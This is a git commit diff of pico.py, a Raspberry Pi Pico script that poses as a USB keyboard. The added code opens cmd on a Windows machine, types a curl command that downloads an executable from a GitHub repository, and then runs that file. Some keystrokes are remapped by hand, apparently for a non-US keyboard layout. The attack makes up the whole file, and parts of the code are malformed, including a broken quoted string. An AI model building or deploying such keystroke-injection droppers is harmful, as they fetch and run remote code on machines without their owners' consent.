71437e379edd967a8240b4f6bf0e7bb7a7a27c1e
ByOle1307 <87281926+ByOle1307@users.noreply.github.com>
2021-09-01 22:47:43 +0200

    Update pico.py

--- pico.py
+++ pico.py
@@ -1,24 +1,56 @@
 import usb_hid
+import time
 from adafruit_hid.keyboard import Keyboard
 from adafruit_hid.keycode import Keycode
+from adafruit_hid.keyboard_layout_us import KeyboardLayoutUS
 
 kbd = Keyboard(usb_hid.devices)
+layout = KeyboardLayoutUS(kbd)
 
 #open cmd
 kbd.send(Keycode.WINDOWS, Keycode.R)
-kbd.write("cmd")
+time.sleep(0.3)
+layout.write("cmd")
 kbd.send(Keycode.ENTER)
+
+time.sleep(0.3)
 
 #go to desktop to save github file there
-kbd.send("cd desktop")
+layout.write("cd desktop")
 kbd.send(Keycode.ENTER)
+
+time.sleep(0.3)
 
 #enter cmd command to clone script from github
-github_link = "https://github.com/joyent/node/tarball/v0.7.1"
-kbd.write("curl -LJO " + github_link)
+"""github_link = "https://github.com/ByOle1307/RaspiPicoDucky/blob/main/github_script.exe""""
+layout.write("curl ")
+kbd.send(Keycode.FORWARD_SLASH)
+layout.write("JLO https")
+kbd.send(Keycode.SHIFT, Keycode.PERIOD)
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+layout.write("github")
+kbd.send(Keycode.PERIOD)
+layout.write("com")
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+layout.write("BzOle1307")
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+layout.write("RaspiPicoDuckz")
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+layout.write("blob")
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+layout.write("main")
+kbd.send(Keycode.SHIFT, Keycode.SEVEN)
+layout.write("github")
+kbd.send(Keycode.SHIFT, Keycode.FORWARD_SLASH)
+layout.write("script.exe")
 
-#start github file
-kbd.write("github_script.exe")
 kbd.send(Keycode.ENTER)
 
+time.sleep(0.3)
 
+#start github file
+layout.write("github")
+kbd.send(Keycode.SHIFT, Keycode.FORWARD_SLASH)
+layout.write("script.exe")
+kbd.send(Keycode.ENTER)
